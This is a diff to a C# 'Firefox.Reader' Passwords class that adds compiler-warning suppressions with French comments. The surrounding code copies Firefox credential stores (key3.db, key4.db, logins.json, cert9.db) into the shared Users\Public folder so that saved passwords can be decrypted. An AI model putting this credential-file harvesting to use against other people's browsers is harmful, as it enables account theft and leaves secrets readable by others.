@@ -5,8 +5,16 @@ namespace Firefox.Reader
 {
     public sealed class Passwords
     {
+#pragma warning disable IDE0044 // Ajouter un modificateur readonly
+#pragma warning disable CS8601 // Existence possible d'une assignation de référence null.
         private static string SystemDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
+#pragma warning restore CS8601 // Existence possible d'une assignation de référence null.
+#pragma warning restore IDE0044 // Ajouter un modificateur readonly
+#pragma warning disable IDE0044 // Ajouter un modificateur readonly
+#pragma warning disable CS8604 // Existence possible d'un argument de référence null.
         private static string CopyTempPath = Path.Combine(SystemDrive, "Users\\Public");
+#pragma warning restore CS8604 // Existence possible d'un argument de référence null.
+#pragma warning restore IDE0044 // Ajouter un modificateur readonly
         private static string[] RequiredFiles = new string[] { "key3.db", "key4.db", "logins.json", "cert9.db" };
 
 		// Copy key3.db, key4.db, logins.json if exists
@@ -28,8 +36,10 @@ namespace Firefox.Reader
 				catch (Exception ex)
 				{
 					Console.WriteLine("Failed to copy files to decrypt passwords\n" + ex);
-					return null;
-				}
+#pragma warning disable CS8603 // Existence possible d'un retour de référence null.
+                    return null;
+#pragma warning restore CS8603 // Existence possible d'un retour de référence null.
+                }
 
 			return Path.Combine(CopyTempPath, profileName);
 		}
